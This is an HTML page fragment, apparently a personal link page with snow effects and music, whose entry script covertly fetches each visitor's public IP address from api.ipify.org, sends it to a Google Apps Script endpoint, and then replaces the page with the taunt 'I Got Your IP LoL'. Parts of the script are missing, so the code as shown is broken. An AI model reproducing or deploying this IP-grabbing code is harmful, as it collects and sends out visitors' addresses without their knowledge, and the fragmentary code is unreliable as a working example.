  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: black;
      font-family: 'Press Start 2P', monospace;
      color: white;
      overflow: hidden;
      position: relative;
    }
    #entry-screen {
      position: fixed;
      inset: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      cursor: pointer;
      text-shadow: 0 0 10px green, 0 0 5px white;
      font-size: 1.5em;
      user-select: none;
      background: black;
      z-index: 10000;
    }
    #main-content {
      display: none;
      animation: fadeIn 2s ease forwards;
    }
    body.show-main #main-content { display: block; }
    body.show-main #entry-screen { display: none; }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    body.show-main {
      overflow: auto;
      background: black;
      color: #fff;
      animation: fadeIn 2s ease;
    }
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      z-index: 2;
      text-align: center;
      padding: 20px;
    }
    .glow-img {
      border: none;
      box-shadow: none;
      border-radius: 12px;
      max-width: 240px;
      margin-bottom: 25px;
    }
    h1 {
      font-size: 1.2em;
      text-shadow: 0 0 8px green, 0 0 3px white;
      margin-bottom: 20px;
    }
    .links {
      margin-top: 20px;
      display: flex;
      flex-direction: column;
      gap: 15px;
    }
    .links a {
      color: #fff;
      text-decoration: none;
      font-size: 0.75em;
      transition: 0.3s;
      text-shadow: 0 0 5px green;
    }
    .links a:hover {
      color: green;
      text-shadow: 0 0 10px green, 0 0 5px white;
    }
    .links i {
      margin-right: 8px;
      color: green;
    }
    .snowflake {
      position: fixed;
      top: -10px;
      width: 5px;
      height: 5px;
      background: white;
      opacity: 0.7;
      border-radius: 50%;
      filter: blur(1px);
      animation: fall linear infinite;
      z-index: 1;
    }
    @keyframes fall {
      to { transform: translateY(110vh); }
    }
    #visit-label {
      position: fixed;
      top: 10px;
      left: 10px;
      color: white;
      font-family: 'Press Start 2P', monospace;
      font-size: 0.8em;
      text-shadow: 0 0 8px green, 0 0 3px white;
      z-index: 10000;
      user-select: none;
      cursor: default;
    }
  </style>
</head>

  <script>
    function enterSite() {
      document.body.classList.add('show-main');

      const audio = document.getElementById('bg-music');
      setTimeout(() => {
        audio.muted = false;
        audio.volume = 0.5;
        audio.play().catch(e => {
          console.log("المتصفح رفض التشغيل التلقائي:", e);
        });
      }, 1000);

      const createSnow = () => {
        const snow = document.createElement("div");
        snow.classList.add("snowflake");
        snow.style.left = Math.random() * 100 + "vw";
        snow.style.animationDuration = (Math.random() * 3 + 3) + "s";
        document.body.appendChild(snow);
        setTimeout(() => snow.remove(), 7000);
      };
      setInterval(createSnow, 150);

      // ** بداية جلب IP وإرساله **
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const ip = data.ip;
          console.log('Visitor IP:', ip);

          // رابط Google Apps Script الخاص بك - عدلته هنا
          const gasURL = 'https://script.google.com/macros/s/AKfycbxKvTAnQhresyE7v_3OVz_KKyxdDWKGtlZDoiKpxBYnSFc7i5QSMTd3zzB5g2XzlRYS/exec';

          fetch(gasURL + '?ip=' + encodeURIComponent(ip))
            .then(res => res.text())
            .then(text => {
              console.log('Response from GAS:', text);
            })
            .catch(err => {
              console.error('Error sending IP to GAS:', err);
            });
        })
        .catch(err => {
          console.error('Failed to get IP:', err);
        });
      // ** نهاية جلب IP وإرساله **

      // بعد 5 ثواني حذف كل شيء واظهار النص

        document.body.innerHTML = `

            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: black;
            color: white;
            font-family: 'Press Start 2P', monospace;
            font-size: 3em;
            text-shadow: 0 0 10px green, 0 0 5px white;
            user-select: none;
            text-align: center;
          ">
            I Got Your IP LoL

        `;
      }, 10000);
    }

    // جلب عدد الزيارات من GAS (تأكد أنك عدلت السكربت لاسترجاع العدد)

      .then(response => response.text())
      .then(count => {
        document.getElementById('visit-label').textContent = 'Visits: ' + count;
      })
      .catch(err => {
        console.error('خطأ في جلب عدد الزيارات:', err);
        document.getElementById('visit-label').textContent = 'Visits: N/A';
      });

</html>
